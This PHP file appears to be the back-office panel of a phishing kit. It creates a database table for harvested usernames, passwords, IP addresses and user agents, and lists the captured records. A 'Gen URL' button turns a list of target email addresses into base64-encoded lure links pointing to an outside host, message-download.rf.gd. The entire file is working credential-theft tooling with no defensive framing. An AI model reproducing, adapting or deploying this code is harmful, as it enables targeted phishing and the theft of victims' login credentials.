<?php
require 'functions.php';

?>
<form method='POST' action=''>
<input type="submit" name="create" value="Create Table"> 
<input type="submit" name="delete" value="Delete Table" onclick="javascript:return confirm('Are you sure to delete table');" > 
<input type="submit" name="getdata" value="Get Data">
<input type="submit" name="genurl" value="Gen URL">
</form>
<div class="thalaimai">
    <table border="1">
	<tr>
		<td>S.No</td>
        <td>Username</td>
		<td>Password</td>
        <td>IP</td>
		<td>User Agent</td>
        <td>Date</td>
		
	</tr>
        <?php
        
    
 if(isset($_POST['genurl'])){

        $i=1;
                $contents=file_get_contents("emails.php");
                $lines=explode(",",$contents);
                foreach($lines as $line){
                    $b64= base64_encode($line);
                    $key='bjhgrdg9845trgjofdgfi3095u34iosdfj3092r09ewudisfjweur90ruweifjidog4u';
                    $url='https://message-download.rf.gd';
                        echo "<tr>
			<td>$i</td>
                        <td> <input id='Input$i' value=".$line."><input type='button'  value='copy' onclick='myFunction($i);'></td>
                        <td> <input id='myInput$i' value=".$url.'/?'.$key.'='.$b64."><input type='button' value='copy' onclick='copyText($i);'></td>
		        </tr>";
		$i++;
        
    }
    
   } 
   
   if(isset($_POST['create'])){ 
   		  $sql = "CREATE TABLE IF NOT EXISTS main (
		id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
		username VARCHAR(255) NOT NULL,
   		 password VARCHAR(255) NOT NULL,
   		 ip VARCHAR(255) NOT NULL,
   		 useragent VARCHAR(255) NOT NULL,
   		 date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
	)";


if ($conn->query($sql) === TRUE) {
  echo "Table created successfully";
} else {
  echo "Error creating table: " . $conn->error;
}
}

if(isset($_POST['delete'])){
   $sql = "DROP TABLE main";
     if ($conn->query($sql) === TRUE) {
  echo "Record deleted successfully";
} else {
  echo "Error deleting record: " . $conn->error;
}
    }

if(isset($_POST['getdata'])){
        $sql = "SELECT * FROM main ORDER BY id";
        $result = $conn->query($sql);

        if (mysqli_num_rows($result) > 0) {
            // output data of each row
            
            while($row = $result->fetch_assoc()) {
                $tr = "<tr>";
                $tr .= "<td>". $row["id"]. "</td>";
                $tr .= "<td>". $row["username"]. "</td>";
                $tr .= "<td>". $row["password"]. "</td>";
                $tr .= "<td>". $row["ip"]. "</td>";
                $tr .= "<td>". $row["useragent"]. "</td>";
                $tr .= "<td>". $row["date"]. "</td>";
                $i++;
                echo $tr .= "</tr>";
            }
            
        } else {
            echo "0 results";
        }   
 
        
} 


  ?>  


</div>
    
<script>
function copyText(i) {
         //alert(i);
           var copiedtxt= document.getElementById("myInput"+i);
               copiedtxt.select();
               document.execCommand('copy');
}
function myFunction(j){
           var copiedtxt= document.getElementById("Input"+j);
               copiedtxt.select();
               document.execCommand('copy');
}
</script>


